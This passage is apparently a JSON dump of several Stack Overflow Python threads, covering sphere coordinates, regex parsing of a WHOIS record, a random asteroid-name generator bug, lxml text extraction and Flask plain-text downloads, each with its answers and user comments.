"https://stackoverflow.com/questions/29398875/how-can-i-obtain-the-coordinates-for-a-sphere-using-python", "title": "How can I obtain the coordinates for a sphere, using python?", "body": "<p>The code above currently produces a cube, not a sphere. How can I correct this? </p>\n\n<pre><code>x = list(range(-5,5))\ny = list(range(-5,5))\nz = list(range(-5,5))\nr = [1,2,3,4,5,6,7,10]\nxcoords = []\nycoords = []\nzcoords = []\n\"\"\"functions used\"\"\"\ndef square(number):\nreturn number**2\n\"\"\"determines which values satisfies the equation for a sphere\"\"\"\nfor itemx in x:\n    for itemy in y:\n        for itemz in z:\n            for itemr in r:\n                if abs(itemx) == abs(itemy) and abs(itemy) == abs(itemz) and square(itemx) + square(itemy) +square(itemz) == itemr:\n                xcoords.append(itemx)\n                ycoords.append(itemy)\n                zcoords.append(itemz)\n\"\"\"determines the number of atoms in the system\"\"\"\nnatoms = len(xcoords)\n\"\"\"writes coords onto txt file\"\"\"\nout = open(\"sphere.xyz\", \"a\")\nprint (natoms)\nout.write(\"%s \\n \\n\" %(natoms))\nout.close()\nfor item in zip(xcoords, ycoords,zcoords):\n   out = open(\"sphere.xyz\", \"a\")\n   print (item)\n   out.write( \"Ar\"  \" \" \" \" \"%2.5s %2.5s %2.5s \\n\" %(item))\n   out.close()\n</code></pre>\n\n<p>I've considered using spherical coordinates to define the parameters for a sphere, but I do not know how to set this up using python. </p>\n"}, {"tags": ["python", "parsing", "text", "split", "find"], "answers": [{"comments": [{"owner": {"reputation": 94141, "user_id": 2867928, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/a8DM1.jpg?s=128&g=1", "display_name": "kasravnd", "link": "https://stackoverflow.com/users/2867928/kasravnd"}, "reply_to_user": {"reputation": 105, "user_id": 4205655, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/27d1bbcdb7d9b48faaf0b2e5d1c42c55?s=128&d=identicon&r=PG&f=1", "display_name": "gamarga", "link": "https://stackoverflow.com/users/4205655/gamarga"}, "edited": false, "score": 0, "creation_date": 1428343449, "post_id": 29399151, "comment_id": 47114441, "body": "@gamarga welcome! so what about accepting the answer? ;)"}, {"owner": {"reputation": 105, "user_id": 4205655, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/27d1bbcdb7d9b48faaf0b2e5d1c42c55?s=128&d=identicon&r=PG&f=1", "display_name": "gamarga", "link": "https://stackoverflow.com/users/4205655/gamarga"}, "edited": false, "score": 1, "creation_date": 1428344550, "post_id": 29399151, "comment_id": 47115049, "body": "Done! (I had to google how to accept answers, newbie in the house eh?!)"}], "tags": [], "owner": {"reputation": 94141, "user_id": 2867928, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/a8DM1.jpg?s=128&g=1", "display_name": "kasravnd", "link": "https://stackoverflow.com/users/2867928/kasravnd"}, "is_accepted": true, "score": 1, "last_activity_date": 1427916329, "creation_date": 1427916329, "answer_id": 29399151, "question_id": 29398864, "link": "https://stackoverflow.com/questions/29398864/how-to-find-text-in-a-column-with-python/29399151#29399151", "title": "How to find text in a column with Python", "body": "<p>You can use regex,in this case <a href=\"https://docs.python.org/2/library/re.html#re.search\" rel=\"nofollow\"><em>re.search</em></a> could does the job :</p>\n\n<pre><code>&gt;&gt;&gt; s=\"\"\"NetRange:       8.8.8.0 - 8.8.8.255\n... \n... CIDR:           8.8.8.0/24\n... \n... NetName:        LVLT-GOGL-8-8-8\n... \n... NetHandle:      NET-8-8-8-0-1\n... \n... Parent:         LVLT-ORG-8-8 (NET-8-0-0-0-1)\n... \n... NetType:        Reallocated\n... \n... NetType:        Reallocated\n... \n... OriginAS:  \n... \n... Organization:   Google Inc. (GOGL)\n... \n... RegDate:        2014-03-14\n... \n... Updated:        2014-03-14\n... \n... Ref:            http://whois.arin.net/rest/net/NET-8-8-8-0-1\"\"\"\n&gt;&gt;&gt; import re\n\n&gt;&gt;&gt; re.search(r'NetName:\\s+(.*)',s).group(1)\n'LVLT-GOGL-8-8-8'\n</code></pre>\n\n<p>Or you can loop over the splitted string and use a generator expression :</p>\n\n<pre><code>&gt;&gt;&gt; next(line.split()[-1] for line in s.split('\\n') if 'NetName:' in line)\n'LVLT-GOGL-8-8-8'\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 19646, "user_id": 494074, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/741e480d426fabd85825861bd6481ccd?s=128&d=identicon&r=PG", "display_name": "Ankur Agarwal", "link": "https://stackoverflow.com/users/494074/ankur-agarwal"}, "is_accepted": false, "score": 0, "last_activity_date": 1427917928, "creation_date": 1427917928, "answer_id": 29399582, "question_id": 29398864, "link": "https://stackoverflow.com/questions/29398864/how-to-find-text-in-a-column-with-python/29399582#29399582", "title": "How to find text in a column with Python", "body": "<pre><code>#!/usr/bin/env python\nimport re\n\nff = \"\"\"NetRange:       8.8.8.0 - 8.8.8.255\n\nCIDR:           8.8.8.0/24\n\nNetName:        LVLT-GOGL-8-8-8\n\nNetHandle:      NET-8-8-8-0-1\n\nParent:         LVLT-ORG-8-8 (NET-8-0-0-0-1)\n\nNetType:        Reallocated\n\nNetType:        Reallocated\n\nOriginAS:  \n\nOrganization:   Google Inc. (GOGL)\n\nRegDate:        2014-03-14\n\nUpdated:        2014-03-14\n\nRef:            http://whois.arin.net/rest/net/NET-8-8-8-0-1\"\"\"\n\n\nm = re.search(\"NetRange:(.*)\\n\", ff)\nprint m.groups() # or do\nprint m.group(1)\n</code></pre>\n"}], "owner": {"reputation": 105, "user_id": 4205655, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/27d1bbcdb7d9b48faaf0b2e5d1c42c55?s=128&d=identicon&r=PG&f=1", "display_name": "gamarga", "link": "https://stackoverflow.com/users/4205655/gamarga"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 192, "favorite_count": 0, "accepted_answer_id": 29399151, "answer_count": 2, "score": 1, "last_activity_date": 1427917973, "creation_date": 1427915381, "last_edit_date": 1427917973, "question_id": 29398864, "link": "https://stackoverflow.com/questions/29398864/how-to-find-text-in-a-column-with-python", "title": "How to find text in a column with Python", "body": "<p>If I had the text below in a variable, what is the best way to be able to search with say <code>\"NetName:\"</code> and get <code>\"LVLT-GOGL-8-8-8\"</code> returned?</p>\n\n<pre><code>NetRange:       8.8.8.0 - 8.8.8.255\n\nCIDR:           8.8.8.0/24\n\nNetName:        LVLT-GOGL-8-8-8\n\nNetHandle:      NET-8-8-8-0-1\n\nParent:         LVLT-ORG-8-8 (NET-8-0-0-0-1)\n\nNetType:        Reallocated\n\nNetType:        Reallocated\n\nOriginAS:  \n\nOrganization:   Google Inc. (GOGL)\n\nRegDate:        2014-03-14\n\nUpdated:        2014-03-14\n\nRef:            http://whois.arin.net/rest/net/NET-8-8-8-0-1\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "random", "syntax"], "comments": [{"owner": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "edited": false, "score": 1, "creation_date": 1427915404, "post_id": 29398844, "comment_id": 46973637, "body": "Thanks for editing Bhargav."}, {"owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "edited": false, "score": 1, "creation_date": 1427915409, "post_id": 29398844, "comment_id": 46973641, "body": "it means end of file ... probably mismatched brackets or quotes"}, {"owner": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "reply_to_user": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "edited": false, "score": 0, "creation_date": 1427915614, "post_id": 29398844, "comment_id": 46973742, "body": "Hmm... Any ideas for fixing this issue?"}, {"owner": {"reputation": 77965, "user_id": 2073595, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ugcXJ.jpg?s=128&g=1", "display_name": "dano", "link": "https://stackoverflow.com/users/2073595/dano"}, "edited": false, "score": 1, "creation_date": 1427915911, "post_id": 29398844, "comment_id": 46973891, "body": "<code>random.randint(&#39;A Type&#39;,&#39;B Type&#39;,&#39;C Type&#39;)</code> isn&#39;t valid, either."}, {"owner": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "edited": false, "score": 1, "creation_date": 1427915963, "post_id": 29398844, "comment_id": 46973918, "body": "You are missing a <code>)</code> at the end of the <code>print</code> statement."}, {"owner": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "edited": false, "score": 0, "creation_date": 1427916099, "post_id": 29398844, "comment_id": 46973977, "body": "I fixed the error but when I ran the program i got this: Traceback (most recent call last):   File &quot;&lt;pyshell#0&gt;&quot;, line 1, in &lt;module&gt;     pick(1)   File &quot;/Users/James/Desktop/Asteroid Name Generator.py&quot;, line 4, in pick     print(&quot;&quot;.join([random.choice(string.ascii_uppercase) for i in range(3)])+&quot;-&quot;+&quot;&quot;.join([random.choice(string.digits) for i in range(3)])+&quot; &quot;+&quot;&quot;.join([random.randint(&#39;A Type&#39;,&#39;B Type&#39;,&#39;C Type&#39;)])) TypeError: randint() takes 3 positional arguments but 4 were given"}, {"owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "edited": false, "score": 0, "creation_date": 1427916236, "post_id": 29398844, "comment_id": 46974046, "body": "I think you want <code>random.choice([&#39;A Type&#39;,&#39;B Type&#39;,&#39;C Type&#39;])</code>"}, {"owner": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "edited": false, "score": 0, "creation_date": 1427916338, "post_id": 29398844, "comment_id": 46974098, "body": "It Worked!! Thank you very much!"}], "answers": [{"tags": [], "owner": {"reputation": 19646, "user_id": 494074, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/741e480d426fabd85825861bd6481ccd?s=128&d=identicon&r=PG", "display_name": "Ankur Agarwal", "link": "https://stackoverflow.com/users/494074/ankur-agarwal"}, "is_accepted": false, "score": 0, "last_activity_date": 1427919050, "creation_date": 1427919050, "answer_id": 29399876, "question_id": 29398844, "link": "https://stackoverflow.com/questions/29398844/random-item-generator-unexpected-eof-while-parsing-error-python-3-4-3/29399876#29399876", "title": "Random Item Generator Unexpected EOF while parsing Error Python 3.4.3", "body": "<pre><code>import string, random\ndef pick(num):\n    for j in range(num):\n        print(\"\".join([random.choice(string.ascii_uppercase) for i in range(3)])+\"-\"+\"\".join([random.choice(string.digits) for i in range(3)])+\" \"+\"\".join(random.sample(['A Type','B Type','C Type'], 1)))\n</code></pre>\n\n<p>This will work. I replaced <code>random.randint</code> with <code>random.sample</code> and removed the <code>[]</code> around <code>random.randint</code> since <code>random.sample</code> returns a list.</p>\n\n<p>You can use this as the last line as well, using <code>random.choice()</code>:</p>\n\n<pre><code>print(\"\".join([random.choice(string.ascii_uppercase) for i in range(3)])+\"-\"+\"\".join([random.choice(string.digits) for i in range(3)])+\" \"+ random.choice(['A Type','B Type','C Type']))\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 17500, "user_id": 3113477, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/TWIEk.jpg?s=128&g=1", "display_name": "A.J. Uppal", "link": "https://stackoverflow.com/users/3113477/a-j-uppal"}, "is_accepted": false, "score": 0, "last_activity_date": 1427921232, "creation_date": 1427921232, "answer_id": 29400491, "question_id": 29398844, "link": "https://stackoverflow.com/questions/29398844/random-item-generator-unexpected-eof-while-parsing-error-python-3-4-3/29400491#29400491", "title": "Random Item Generator Unexpected EOF while parsing Error Python 3.4.3", "body": "<p>You can use <code>random.choice</code> to get a random value from a list, then add it to your code:</p>\n\n<pre><code>import string, random\ndef pick(num):\n    for j in range(num):\n        print(\"\".join([random.choice(string.ascii_uppercase) for i in range(3)])+\"-\"+\"\".join([random.choice(string.digits) for i in range(3)]+\" \"+random.choice([\"A\", \"B\", \"C\"])+\" Type\")\n</code></pre>\n\n<p>As such:</p>\n\n<pre><code>&gt;&gt;&gt; pick(5)\nMYO-078 B Type\nTYR-215 C Type\nIDY-604 C Type\nFRA-272 A Type\nWLJ-576 A Type\n&gt;&gt;&gt; pick(0)\n&gt;&gt;&gt; pick(3)\nNEJ-767 A Type\nPVD-879 C Type\nACP-344 A Type\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 137, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1427921232, "creation_date": 1427915322, "last_edit_date": 1427915715, "question_id": 29398844, "link": "https://stackoverflow.com/questions/29398844/random-item-generator-unexpected-eof-while-parsing-error-python-3-4-3", "title": "Random Item Generator Unexpected EOF while parsing Error Python 3.4.3", "body": "<p>Hello I am trying to make a Generator for asteroid types, and names. The finished product should make items like this:</p>\n\n<pre><code>MUS-786 A Type\nAKL-675 C Type\nBHF-877 B Type \n</code></pre>\n\n<p>Etc.</p>\n\n<p>I already have the code for making the String of numbers, and Letters with the hyphen in between:</p>\n\n<pre><code>import string, random\ndef pick(num):\n    for j in range(num):\n        print(\"\".join([random.choice(string.ascii_uppercase) for i in range(3)])+\"-\"+\"\".join([random.choice(string.digits) for i in range(3)])\n</code></pre>\n\n<p>It works great, but i am trying to put a random asteroid type in as well (A Type, B Type, C type) </p>\n\n<p>Here is the final code i was using:</p>\n\n<pre><code>import string, random\ndef pick(num):\n    for j in range(num):\n        print(\"\".join([random.choice(string.ascii_uppercase) for i in range(3)])+\"-\"+\"\".join([random.choice(string.digits) for i in range(3)])+\" \"+\"\".join([random.randint('A Type','B Type','C Type')])\n</code></pre>\n\n<p>This Gave me an error saying that there was an unexpected EOF when parsing.</p>\n\n<p>What does <code>EOF</code> mean? What can I do to fix this?</p>\n"}, {"tags": ["python", "html", "xpath", "web-scraping", "lxml"], "comments": [{"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 0, "creation_date": 1427915014, "post_id": 29398751, "comment_id": 46973419, "body": "What HTML parsing library are you using?"}, {"owner": {"reputation": 473, "user_id": 1367524, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f44e8c5ebe87f9060d24416a7821f9a5?s=128&d=identicon&r=PG", "display_name": "Yuka", "link": "https://stackoverflow.com/users/1367524/yuka"}, "reply_to_user": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 0, "creation_date": 1427915438, "post_id": 29398751, "comment_id": 46973649, "body": "I&#39;m using lxml, I&#39;ve updated the question."}], "answers": [{"tags": [], "owner": {"reputation": 88945, "user_id": 290085, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/306077a2fb7af6587f470214a1b337ff?s=128&d=identicon&r=PG", "display_name": "kjhughes", "link": "https://stackoverflow.com/users/290085/kjhughes"}, "is_accepted": false, "score": 3, "last_activity_date": 1427917741, "creation_date": 1427917741, "answer_id": 29399533, "question_id": 29398751, "link": "https://stackoverflow.com/questions/29398751/how-to-select-text-without-the-html-markup/29399533#29399533", "title": "How to select text without the HTML markup", "body": "<p>You can use <code>normalize-space()</code> in the XPath.  Then</p>\n\n<pre><code>from lxml import html\n\nhtml_snippet = '&lt;p class=\"something\"&gt;This class has some &lt;strong&gt;text&lt;/strong&gt; and a few &lt;a href=\"http://www.example.com\"&gt;links&lt;/a&gt; in it.&lt;/p&gt;'\nxpath_query = \"normalize-space(//p[@class='something'])\"\n\ntree = html.fromstring(html_snippet)\nprint tree.xpath(xpath_query)\n</code></pre>\n\n<p>will yield</p>\n\n<pre><code>This class has some text and a few links in it.\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "is_accepted": true, "score": 1, "last_activity_date": 1427917747, "creation_date": 1427917747, "answer_id": 29399534, "question_id": 29398751, "link": "https://stackoverflow.com/questions/29398751/how-to-select-text-without-the-html-markup/29399534#29399534", "title": "How to select text without the HTML markup", "body": "<p>You could call <code>.text_content()</code> on the lxml Element, instead of fetching the text with XPath.</p>\n\n<pre><code>from lxml import html\n\nhtml_snippet = '&lt;p class=\"something\"&gt;This class has some &lt;strong&gt;text&lt;/strong&gt; and a few &lt;a href=\"http://www.example.com\"&gt;links&lt;/a&gt; in it.&lt;/p&gt;'\n\nxpath_query = \"//p[@class='something']\"\n\ntree = html.fromstring(html_snippet)\nquery_results = tree.xpath(xpath_query)\nfor item in query_results:\n    print \"'{0}'\".format(item.text_content())\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 928, "user_id": 2288623, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PNDRI.png?s=128&g=1", "display_name": "bjimba", "link": "https://stackoverflow.com/users/2288623/bjimba"}, "is_accepted": false, "score": 0, "last_activity_date": 1427917839, "creation_date": 1427917839, "answer_id": 29399561, "question_id": 29398751, "link": "https://stackoverflow.com/questions/29398751/how-to-select-text-without-the-html-markup/29399561#29399561", "title": "How to select text without the HTML markup", "body": "<p>An alternate one-liner on your original code: use a <code>join</code> with an empty string separator:</p>\n\n<pre><code>print(\"\".join(query_results))\n</code></pre>\n"}], "owner": {"reputation": 473, "user_id": 1367524, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f44e8c5ebe87f9060d24416a7821f9a5?s=128&d=identicon&r=PG", "display_name": "Yuka", "link": "https://stackoverflow.com/users/1367524/yuka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 339, "favorite_count": 0, "accepted_answer_id": 29399534, "answer_count": 3, "score": 2, "last_activity_date": 1427947882, "creation_date": 1427914958, "last_edit_date": 1427947882, "question_id": 29398751, "link": "https://stackoverflow.com/questions/29398751/how-to-select-text-without-the-html-markup", "title": "How to select text without the HTML markup", "body": "<p>I am working on a web scraper (using Python), so I have a chunk of HTML from which I am trying to extract text. One of the snippets looks something like this:</p>\n\n<pre><code>&lt;p class=\"something\"&gt;This class has some &lt;strong&gt;text&lt;/strong&gt; and a few &lt;a href=\"http://www.example.com\"&gt;links&lt;/a&gt; in it.&lt;/p&gt;\n</code></pre>\n\n<p>I want to extract the text from this class. Now, I could use something along the lines of</p>\n\n<pre><code>//p[@class='something')]//text()\n</code></pre>\n\n<p>but this leads to each chunk of text ending up as a separate result element, like this:</p>\n\n<pre><code>(This class has some ,text, and a few ,links, in it.)\n</code></pre>\n\n<p>The desired output would contain all the text in one element, like this:</p>\n\n<pre><code>This class has some text and a few links in it.\n</code></pre>\n\n<p>Is there an easy or elegant way to achieve this?</p>\n\n<p><strong>Edit</strong>: Here's the code that produces the result given above.</p>\n\n<pre><code>from lxml import html\n\nhtml_snippet = '&lt;p class=\"something\"&gt;This class has some &lt;strong&gt;text&lt;/strong&gt; and a few &lt;a href=\"http://www.example.com\"&gt;links&lt;/a&gt; in it.&lt;/p&gt;'\n\nxpath_query = \"//p[@class='something']//text()\"\n\ntree = html.fromstring(html_snippet)\nquery_results = tree.xpath(xpath_query)\nfor item in query_results:\n    print \"'{0}'\".format(item)\n</code></pre>\n"}, {"tags": ["python", "html", "flask"], "answers": [{"tags": [], "owner": {"reputation": 97255, "user_id": 400617, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5aa7ef250a486833a8c6c933c523b282?s=128&d=identicon&r=PG", "display_name": "davidism", "link": "https://stackoverflow.com/users/400617/davidism"}, "is_accepted": false, "score": 3, "last_activity_date": 1427916677, "creation_date": 1427916677, "answer_id": 29399228, "question_id": 29398651, "link": "https://stackoverflow.com/questions/29398651/txt-file-downloaded-is-being-viewed-as-html-and-that-is-excluding-the-empty-line/29399228#29399228", "title": "txt file downloaded is being viewed as html and that is excluding the empty lines", "body": "<p>If you're just trying to send an existing file on the server, use <a href=\"http://flask.pocoo.org/docs/0.10/api/#flask.send_from_directory\" rel=\"nofollow\"><code>send_from_directory</code></a>.</p>\n\n<p>If you're trying to make a response (for example, if you're generating data in memory, <a href=\"http://flask.pocoo.org/docs/0.10/api/#flask.make_response\" rel=\"nofollow\"><code>make_response</code></a> defaults to <code>text/html</code> (it's just a shortcut which isn't applicable in your case).  Create a response even <em>more</em> directly in order to override that using <a href=\"http://flask.pocoo.org/docs/0.10/api/#flask.Flask.response_class\" rel=\"nofollow\"><code>app.response_class</code></a>.</p>\n\n<p>This is a small example demonstrating both techniques.</p>\n\n<pre><code>from flask import Flask, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/file')\ndef download_file():\n    # change app.root_path to whatever the directory actually is\n    # this just serves this python file (named example.py) as plain text\n    return send_from_directory(\n        app.root_path, 'example.py',\n        as_attachment=True, mimetype='text/plain'\n    )\n\n@app.route('/mem')\ndef download_mem():\n    # instantiate the response class directly\n    # pass the mimetype\n    r = app.response_class('test data\\n\\ntest data', mimetype='text/plain')\n    # add the attachment header\n    r.headers.set('Content-Disposition', 'attachment', filename='test_data.txt')\n    return r\n\napp.run('localhost', debug=True)\n</code></pre>\n"}], "owner": {"reputation": 57, "user_id": 4676513, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/4a81a5bd85c4d8758578e24439dc3af0?s=128&d=identicon&r=PG&f=1", "display_name": "Fabiano Lima", "link": "https://stackoverflow.com/users/4676513/fabiano-lima"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 359, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1427921084, "creation_date": 1427914653, "last_edit_date": 1427921084, "question_id": 29398651, "link": "https://stackoverflow.com/questions/29398651/txt-file-downloaded-is-being-viewed-as-html-and-that-is-excluding-the-empty-line", "title": "txt file downloaded is being viewed as html and that is excluding the empty lines", "body": "<p>I've a Python/Flask app that is working ok locally. I have deployed it to the cloud (pythonanywhere) and it is all working on there as well except for a file that is being downloaded to the user that is coming as html, so the empty lines of the file are being excluded. That file is txt. When the user click on that, it opens on notepad. If opening that file in notepad++ the empty lines are there in the way it should be.</p>\n\n<p>Following the Flask code to send that file: </p>\n\n<pre><code>response = make_response(result)\nresponse.headers[\"Content-Disposition\"] = \"attachment; filename=file_to_user.txt\"\n</code></pre>\n\n<p>If I use \"inline instead of attachment\", the empty lines are showed OK directly on the browser. </p>\n\n<p>I've tried to add \"Content type text/plain\" before \"Content-Disposition\", but I believe that it is the default, so, no effect. </p>\n\n<p>Anyone knows how could the user see that as txt file, instead of html when opening directly using notepad for example?</p>\n"}, {"tags": ["python", "list", "dictionary", "tuples"], "comments": [{"owner": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "edited": false, "score": 3, "creation_date": 1427914521, "post_id": 29398597, "comment_id": 46973122, "body": "First lesson: Do not use <code>list</code>,<code>tuple</code> and <code>dict</code> as variables as they shadow the built-in functions"}, {"owner": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "edited": false, "score": 2, "creation_date": 1427914710, "post_id": 29398597, "comment_id": 46973235, "body": "What is your expected output?"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427914751, "post_id": 29398597, "comment_id": 46973261, "body": "what is b supposed to be?"}, {"owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "edited": false, "score": 0, "creation_date": 1427914855, "post_id": 29398597, "comment_id": 46973324, "body": "Please show us expected output for provided input data"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "reply_to_user": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "edited": false, "score": 1, "creation_date": 1427914895, "post_id": 29398597, "comment_id": 46973345, "body": "@Bhargav Rao: I am aware that you would not use either of those in the code, just trying to explain my process"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 1, "creation_date": 1427914956, "post_id": 29398597, "comment_id": 46973378, "body": "Your code still makes no sense.  The closest I can get is <code>([int(d.get(&quot;a&quot;, 1)) * b for d, b in l ])</code>"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427914960, "post_id": 29398597, "comment_id": 46973382, "body": "@Padraic Cunningham: &#39;b&#39; is the weight, or integer as the second element in the tuple. Such as 0.25 in the first one, 0.50 in the second one"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427915166, "post_id": 29398597, "comment_id": 46973509, "body": "@McLean25, a minimal example with the output you expect will help a lot."}, {"owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "edited": false, "score": 0, "creation_date": 1427915236, "post_id": 29398597, "comment_id": 46973545, "body": "also your real code copied and pasted(a minimal example) would be helpful ... I suspect you are trying to type it from memory"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic 